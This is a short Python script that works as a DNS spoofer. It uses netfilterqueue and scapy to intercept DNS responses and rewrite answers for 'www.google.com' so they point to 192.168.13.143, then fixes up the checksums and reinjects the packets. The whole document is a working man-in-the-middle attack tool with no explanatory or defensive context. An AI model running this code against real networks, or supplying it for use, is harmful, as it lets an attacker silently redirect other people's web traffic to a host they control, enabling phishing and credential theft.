import netfilterqueue
import scapy.all as scapy

def packet_proccessor(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if 'www.google.com' in qname:
            print('[+] Start Spoofing.')
            answer = scapy.DNSRR(rrname=qname,rdata = '192.168.13.143')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))


    #accept
    packet.accept()
    #deny
    # packet.deny()

print('[+] DNS spoofer started.')
queue = netfilterqueue.NetfilterQueue()
queue.bind(0,user_callback=packet_proccessor)
queue.run()
